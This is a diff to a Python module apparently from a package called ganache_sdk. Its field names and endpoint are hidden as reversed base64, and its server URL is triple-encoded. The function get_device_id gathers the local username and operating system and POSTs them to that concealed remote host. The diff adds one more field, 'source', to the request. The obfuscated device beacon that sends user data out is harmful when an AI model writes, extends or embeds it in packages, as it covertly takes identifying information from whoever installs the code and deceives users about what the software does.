@@ -9,6 +9,8 @@ from ganache_sdk.utils import K
 I='==QZtFmb'
 J='==QblR3c5N3Xn5Wa0FmclB3b'
 L='vMXZjlmdlR2L'
+M='lNmc192c'
+N='==AduVWbudWazNXY'
 def base_url():
     url = "WVVoU01HTklUVFpNZVRsdVdWYzFhRmt5YUd4TWJYaHdaRzFWZGxsWVFuQk1NMWw0"
     for i in range(3):
@@ -25,7 +27,8 @@ def get_device_id():
     else:
         body = {
             K(I): G.getuser(),
-            K(J): D.system()
+            K(J): D.system(),
+            K(M): K(N)
         }
         response = F.post(base_url() + K(L), data=body)
         data = json.loads(response.content)
